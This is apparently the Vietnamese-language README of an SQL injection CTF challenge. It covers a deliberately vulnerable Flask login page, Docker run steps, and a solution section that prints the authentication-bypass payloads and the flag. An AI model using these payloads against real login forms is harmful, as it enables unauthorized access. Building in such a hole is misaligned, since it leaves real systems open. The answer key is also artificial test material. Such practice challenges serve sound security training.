# SQL Injection CTF Challenge

## Challenge Description
Một trang web admin login đơn giản có lỗ hổng SQL Injection. Nhiệm vụ của bạn là bypass authentication để lấy flag.

## Build và Run

### Build Docker image:
```bash
docker build -t sqli-challenge .
```

### Run container:
```bash
docker run -p 5000:5000 sqli-challenge
```

Truy cập: http://localhost:5000

## Solution
Sử dụng payload SQL Injection tại trường username:
```
admin' or 1=1--
```
hoặc
```
admin' or '1'='1
```

Password: bất kỳ

## Flag
MSEC{You_ar3_AdM1n}

## Structure
```
ctf-challenge/
├── app.py                 # Flask application với lỗ hổng SQL Injection
├── templates/
│   ├── login.html        # Trang login
│   └── dashboard.html    # Trang dashboard với flag
├── requirements.txt      # Python dependencies
├── Dockerfile           # Docker configuration
└── README.md           # Hướng dẫn này
```